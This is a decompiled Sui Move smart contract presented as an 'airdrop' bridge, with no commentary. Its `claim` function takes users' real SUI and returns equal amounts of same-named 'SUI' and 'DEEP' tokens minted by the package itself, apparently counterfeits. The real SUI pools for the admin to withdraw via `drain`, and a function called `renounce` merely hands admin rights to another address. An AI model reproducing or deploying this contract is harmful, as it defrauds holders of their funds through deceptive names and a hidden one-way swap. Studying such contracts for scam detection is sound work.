module 0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::airdrop {
    struct Bridge has key {
        id: 0x2::object::UID,
        suibalance: 0x2::balance::Balance<0x2::sui::SUI>,
        suibridgebalance: 0x2::balance::Balance<0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::sui::SUI>,
        deepbridgebalance: 0x2::balance::Balance<0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::deep::DEEP>,
        admin: address,
    }

    public entry fun claim(arg0: &mut Bridge, arg1: 0x2::coin::Coin<0x2::sui::SUI>, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg2);
        let v1 = 0x2::coin::value<0x2::sui::SUI>(&arg1);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::deep::DEEP>>(0x2::coin::take<0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::deep::DEEP>(&mut arg0.deepbridgebalance, v1, arg2), v0);
        0x2::coin::put<0x2::sui::SUI>(&mut arg0.suibalance, arg1);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::sui::SUI>>(0x2::coin::take<0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::sui::SUI>(&mut arg0.suibridgebalance, v1, arg2), v0);
    }

    public entry fun depositBridgeDeep(arg0: &mut Bridge, arg1: 0x2::coin::Coin<0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::deep::DEEP>) {
        0x2::coin::put<0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::deep::DEEP>(&mut arg0.deepbridgebalance, arg1);
    }

    public entry fun depositBridgeSUI(arg0: &mut Bridge, arg1: 0x2::coin::Coin<0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::sui::SUI>) {
        0x2::coin::put<0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::sui::SUI>(&mut arg0.suibridgebalance, arg1);
    }

    public entry fun drain(arg0: &mut Bridge, arg1: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg1) == arg0.admin, 0);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::take<0x2::sui::SUI>(&mut arg0.suibalance, 0x2::balance::value<0x2::sui::SUI>(&arg0.suibalance), arg1), arg0.admin);
    }

    fun init(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = Bridge{
            id                : 0x2::object::new(arg0),
            suibalance        : 0x2::balance::zero<0x2::sui::SUI>(),
            suibridgebalance  : 0x2::balance::zero<0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::sui::SUI>(),
            deepbridgebalance : 0x2::balance::zero<0x44eb9716279a538ccc2240e55a0f36ab92efcffa698a95d97ca548176a004dcc::deep::DEEP>(),
            admin             : 0x2::tx_context::sender(arg0),
        };
        0x2::transfer::share_object<Bridge>(v0);
    }

    public entry fun renounce(arg0: &mut Bridge, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg2) == arg0.admin, 0);
        arg0.admin = arg1;
    }

    // decompiled from Move bytecode v6
}

